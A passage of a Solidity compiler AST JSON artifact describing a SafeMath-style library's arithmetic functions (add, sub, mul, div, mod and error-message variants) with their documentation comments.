													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 289,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2357:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2345:22:2"
									},
									"returnParameters": {
										"id": 296,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 293,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 313,
												"src": "2391:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 292,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2391:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 295,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 313,
												"src": "2397:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 294,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2397:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2390:15:2"
									},
									"scope": 464,
									"src": "2330:190:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 327,
										"nodeType": "Block",
										"src": "2822:29:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 325,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 323,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 316,
														"src": "2839:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"id": 324,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 318,
														"src": "2843:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2839:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 322,
												"id": 326,
												"nodeType": "Return",
												"src": "2832:12:2"
											}
										]
									},
									"documentation": {
										"id": 314,
										"nodeType": "StructuredDocumentation",
										"src": "2526:224:2",
										"text": " @dev Returns the addition of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `+` operator.\n Requirements:\n - Addition cannot overflow."
									},
									"id": 328,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nameLocation": "2764:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 319,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 316,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "2776:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 328,
												"src": "2768:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 315,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2768:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 318,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "2787:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 328,
												"src": "2779:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 317,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2779:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2767:22:2"
									},
									"returnParameters": {
										"id": 322,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 321,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 328,
												"src": "2813:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 320,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2813:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2812:9:2"
									},
									"scope": 464,
									"src": "2755:96:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 342,
										"nodeType": "Block",
										"src": "3189:29:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 340,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 338,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 331,
														"src": "3206:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"id": 339,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 333,
														"src": "3210:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3206:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 337,
												"id": 341,
												"nodeType": "Return",
												"src": "3199:12:2"
											}
										]
									},
									"documentation": {
										"id": 329,
										"nodeType": "StructuredDocumentation",
										"src": "2857:260:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 343,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nameLocation": "3131:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 334,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 331,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "3143:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 343,
												"src": "3135:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 330,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3135:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 333,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "3154:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 343,
												"src": "3146:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 332,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3146:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3134:22:2"
									},
									"returnParameters": {
										"id": 337,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 336,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 343,
												"src": "3180:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 335,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3180:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3179:9:2"
									},
									"scope": 464,
									"src": "3122:96:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 357,
										"nodeType": "Block",
										"src": "3532:29:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 355,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 353,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 346,
														"src": "3549:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"id": 354,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 348,
														"src": "3553:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3549:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 352,
												"id": 356,
												"nodeType": "Return",
												"src": "3542:12:2"
											}
										]
									},
									"documentation": {
										"id": 344,
										"nodeType": "StructuredDocumentation",
										"src": "3224:236:2",
										"text": " @dev Returns the multiplication of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `*` operator.\n Requirements:\n - Multiplication cannot overflow."
									},
									"id": 358,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nameLocation": "3474:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 349,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 346,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "3486:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 358,
												"src": "3478:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 345,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3478:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 348,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "3497:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 358,
												"src": "3489:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 347,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3489:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3477:22:2"
									},
									"returnParameters": {
										"id": 352,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 351,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 358,
												"src": "3523:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 350,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3523:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3522:9:2"
									},
									"scope": 464,
									"src": "3465:96:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 372,
										"nodeType": "Block",
										"src": "3917:29:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 370,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 368,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 361,
														"src": "3934:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 369,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 363,
														"src": "3938:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3934:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 367,
												"id": 371,
												"nodeType": "Return",
												"src": "3927:12:2"
											}
										]
									},
									"documentation": {
										"id": 359,
										"nodeType": "StructuredDocumentation",
										"src": "3567:278:2",
										"text": " @dev Returns the integer division of two unsigned integers, reverting on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator.\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 373,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nameLocation": "3859:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 364,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 361,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "3871:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 373,
												"src": "3863:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 360,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3863:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 363,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "3882:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 373,
												"src": "3874:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 362,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3874:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3862:22:2"
									},
									"returnParameters": {
										"id": 367,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 366,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 373,
												"src": "3908:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 365,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3908:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3907:9:2"
									},
									"scope": 464,
									"src": "3850:96:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 387,
										"nodeType": "Block",
										"src": "4466:29:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 385,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 383,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 376,
														"src": "4483:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"id": 384,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 378,
														"src": "4487:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4483:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 382,
												"id": 386,
												"nodeType": "Return",
												"src": "4476:12:2"
											}
										]
									},
									"documentation": {
										"id": 374,
										"nodeType": "StructuredDocumentation",
										"src": "3952:442:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 388,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nameLocation": "4408:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 379,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 376,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "4420:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 388,
												"src": "4412:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 375,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4412:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 378,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "4431:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 388,
												"src": "4423:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 377,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4423:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4411:22:2"
									},
									"returnParameters": {
										"id": 382,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 381,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 388,
												"src": "4457:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 380,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4457:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4456:9:2"
									},
									"scope": 464,
									"src": "4399:96:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 412,
										"nodeType": "Block",
										"src": "5084:106:2",
										"statements": [
											{
												"id": 411,
												"nodeType": "UncheckedBlock",
												"src": "5094:90:2",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 403,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 401,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 393,
																		"src": "5126:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "<=",
																	"rightExpression": {
																		"id": 402,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 391,
																		"src": "5131:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "5126:6:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"id": 404,
																	"name": "errorMessage",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 395,
																	"src": "5134:12:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 400,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	4294967278,
																	4294967278
																],
																"referencedDeclaration": 4294967278,
																"src": "5118:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 405,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5118:29:2",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 406,
														"nodeType": "ExpressionStatement",
														"src": "5118:29:2"
													},
													{
														"expression": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 409,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 407,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 391,
																"src": "5168:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"id": 408,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 393,
																"src": "5172:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "5168:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"functionReturnParameters": 399,
														"id": 410,
														"nodeType": "Return",
														"src": "5161:12:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 389,
										"nodeType": "StructuredDocumentation",
										"src": "4501:453:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n overflow (when the result is negative).\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {trySub}.\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 413,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nameLocation": "4968:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 396,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 391,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "4989:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 413,
												"src": "4981:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 390,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4981:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 393,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "5008:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 413,
												"src": "5000:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 392,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5000:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 395,
												"mutability": "mutable",
												"name": "errorMessage",
												"nameLocation": "5033:12:2",
												"nodeType": "VariableDeclaration",
												"scope": 413,
												"src": "5019:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 394,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5019:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4971:80:2"
									},
									"returnParameters": {
										"id": 399,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 398,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 413,
												"src": "5075:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 397,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5075:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5074:9:2"
									},
									"scope": 464,
									"src": "4959:231:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 437,
										"nodeType": "Block",
										"src": "5799:105:2",
										"statements": [
											{
												"id": 436,
												"nodeType": "UncheckedBlock",
												"src": "5809:89:2",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 428,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 426,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 418,
																		"src": "5841:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": ">",
																	"rightExpression": {
																		"hexValue": "30",
																		"id": 427,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5845:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	},
																	"src": "5841:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"id": 429,
																	"name": "errorMessage",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 420,
																	"src": "5848:12:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 425,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	4294967278,
																	4294967278
																],
																"referencedDeclaration": 4294967278,
																"src": "5833:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 430,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5833:28:2",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 431,
														"nodeType": "ExpressionStatement",
														"src": "5833:28:2"
													},
													{
														"expression": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 434,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 432,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 416,
																"src": "5882:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"id": 433,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 418,
																"src": "5886:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "5882:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"functionReturnParameters": 424,
														"id": 435,
														"nodeType": "Return",
